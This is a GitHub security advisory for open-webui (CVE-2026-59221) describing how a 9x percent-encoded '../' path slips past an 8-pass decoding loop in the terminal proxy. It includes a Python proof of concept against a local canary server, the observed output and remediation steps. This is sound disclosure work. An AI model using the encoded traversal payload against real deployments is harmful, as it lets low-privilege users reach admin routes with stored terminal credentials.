# [H] open-webui terminal proxy path traversal guard bypass via 9x encoded traversal

## Summary
Severity: High
Advisory: GHSA-frvj-c5qp-xj4w
CVE: CVE-2026-59221
CWE: CWE-22, CWE-918
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-07-24
Source: https://github.com/advisories/GHSA-frvj-c5qp-xj4w
Type: github-advisory

## Affected
- PyPI: `open-webui` — affected >=0.9.6 <0.10.0

## Details
AI assistance was used to help inspect the code and prepare this report.

## Summary

The fix for GHSA-r2wg-2mcr-66rv is incomplete in v0.9.6 and current main. `backend/open_webui/routers/terminals.py` documents `_sanitize_proxy_path()` as decoding until stable, but the implementation stops after 8 `unquote()` passes. A 9x percent-encoded `../...` path parameter remains once-encoded after the loop, passes the `posixpath.normpath()` and `cleaned.startswith('..')` checks, and is forwarded to the configured terminal server. The upstream server then receives a decoded traversal path such as `/base/../admin/system`.

## Impact

A user who has access to an admin-configured terminal connection can bypass the terminal proxy path traversal guard and cause Open WebUI to forward requests with the configured terminal credentials and `X-User-Id` header to paths outside the intended normalized proxy path. For orchestrator-backed terminal connections the same sanitized path is placed under `/p/{policy_id}/{safe_path}`, so the bypass can also target sibling or parent routes after upstream decoding. This is a bypass of the same terminal proxy boundary covered by GHSA-r2wg-2mcr-66rv.

This does not require adding a malicious terminal server or convincing an administrator to weaken settings. The attacker only needs normal access to an existing configured terminal connection.

## Reproduction

The following standalone Python script mirrors the current sanitizer and uses a local aiohttp server as the terminal-server canary. It shows that 8x encoding is rejected but 9x encoding is accepted and forwarded as a traversal after the upstream framework decodes the path.

```python
import asyncio, posixpath
from urllib.parse import unquote
from aiohttp import web, ClientSession, ClientTimeout

def sanitize(path):
    decoded = path
    for _ in range(8):
        once = unquote(decoded)
        if once == decoded:
            break
        decoded = once
    cleaned = posixpath.normpath(decoded).lstrip('/')
    if cleaned.startswith('..') or cleaned == '.':
        return None
    return cleaned

def enc(s, rounds):
    out = ''.join(f'%{b:02X}' for b in s.encode())
    for _ in range(rounds - 1):
        out = out.replace('%', '%25')
    return out

async def main():
    async def handler(request):
        return web.json_response({'raw_path': request.raw_path, 'path': request.path})
    app = web.Application()
    app.router.add_route('*', '/{tail:.*}', handler)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '127.0.0.1', 0)
    await site.start()
    port = site._server.sockets[0].getsockname()[1]

    for rounds in (8, 9):
        safe = sanitize(enc('../admin/system', rounds))
        print(rounds, safe)
        if safe:
            url = f'http://127.0.0.1:{port}/base/{safe}'
            async with ClientSession(timeout=ClientTimeout(total=10)) as session:
                async with session.get(url) as response:
                    print(await response.json())
    await runner.cleanup()

asyncio.run(main())
```

Observed output on current main and v0.9.6 sanitizer:

```text
8 None
9 %2E%2E%2F%61%64%6D%69%6E%2F%73%79%73%74%65%6D
{'raw_path': '/base/..%2Fadmin%2Fsystem', 'path': '/base/../admin/system'}
```

The 9x encoded path argument is 285 bytes long, so this is not a megabyte-sized or impractical URL. When sent through the real route, account for the ASGI server decoding the HTTP path once before filling the `{path:path}` parameter: an external request can use one additional encoding layer so `_sanitize_proxy_path()` receives the 9x encoded parameter shown above.

## Root Cause / Technical Details

`_sanitize_proxy_path()` in `backend/open_webui/routers/terminals.py` performs this loop:

```python
decoded = path
for _ in range(8):
    once = unquote(decoded)
    if once == decoded:
        break
    decoded = once
```

The subsequent traversal check is applied only to the value after those 8 iterations. If the input still contains encoded dot and slash bytes after the loop, `posixpath.normpath()` treats them as ordinary characters rather than path separators. The code then builds `target_url = f'{base_url}/{safe_path}'` and sends it with `aiohttp.ClientSession.request()`. The upstream server receives and decodes the forwarded path, turning the accepted `%2E%2E%2F...` into `../...`.

The same vulnerable sanitizer is present in v0.9.6, the latest release. I verified the v0.9.6 `backend/open_webui/routers/terminals.py` hash matches current main for this file.

## Remediation

Do not rely on a fixed decode-depth cap for a traversal security boundary. Recommended fixes:

1. Decode until stable with a strict input length cap, and reject if the final value still contains encoded dot, slash, or backslash separators.
2. Reconstruct the allowed relative path from fully decoded segments: split on path separators, reject empty/current/parent segments, then join allowed segments with `/`.
3. Add regression tests for at least 9x and 10x encoded `../` payloads, including a route-level test that accounts for the ASGI server's initial path decode before the `{path:path}` parameter reaches `_sanitize_proxy_path()`.

## References
- https://github.com/open-webui/open-webui/security/advisories/GHSA-frvj-c5qp-xj4w
- https://nvd.nist.gov/vuln/detail/CVE-2026-59221
- https://github.com/open-webui/open-webui/pull/26050
- https://github.com/open-webui/open-webui/commit/05098d25a58d03738e01c4e85e8852c3b4ad849c
- https://github.com/open-webui/open-webui
- https://github.com/open-webui/open-webui/releases/tag/v0.10.0
